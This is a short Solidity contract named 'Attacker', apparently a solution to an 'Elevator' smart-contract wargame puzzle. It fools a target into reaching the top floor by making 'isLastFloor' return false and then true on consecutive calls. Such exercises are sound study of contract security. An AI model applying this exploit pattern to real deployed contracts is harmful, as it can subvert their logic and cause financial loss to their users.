// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface IElevator {
    function goTo(uint _floor) external; 
}

contract Attacker is Building {
    IElevator immutable elevator;
    bool trick = false;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
    }

    function goTo(uint _floor) external {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint) external returns (bool) {
        if (trick) {
            trick = false;
            return true;
        } else {
            trick = true;
            return false;
        }
    }

}